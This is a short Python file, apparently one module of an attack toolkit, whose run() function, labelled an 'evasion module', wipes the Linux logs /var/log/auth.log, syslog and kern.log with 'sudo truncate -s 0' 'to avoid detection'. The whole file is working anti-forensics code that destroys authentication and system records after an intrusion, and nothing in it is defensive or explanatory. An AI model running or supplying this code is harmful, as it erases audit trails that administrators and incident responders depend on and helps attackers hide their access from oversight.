import os
import logging

def run():
    logging.basicConfig(filename="evasion.log", level=logging.INFO)
    logging.info("Starting evasion module...")

    print("Clearing logs to avoid detection...")

    log_files = [
        "/var/log/auth.log",
        "/var/log/syslog",
        "/var/log/kern.log"
    ]

    for log in log_files:
        if os.path.exists(log):
            try:
                os.system(f"sudo truncate -s 0 {log}")
                print(f"Cleared {log}")
                logging.info(f"Cleared {log}")
            except Exception as e:
                print(f"Error clearing {log}: {e}")
                logging.error(f"Error clearing {log}: {e}")
        else:
            print(f"Log file {log} not found.")
            logging.warning(f"Log file {log} not found.")

    print("Log clearing complete.")
    logging.info("Evasion module completed.")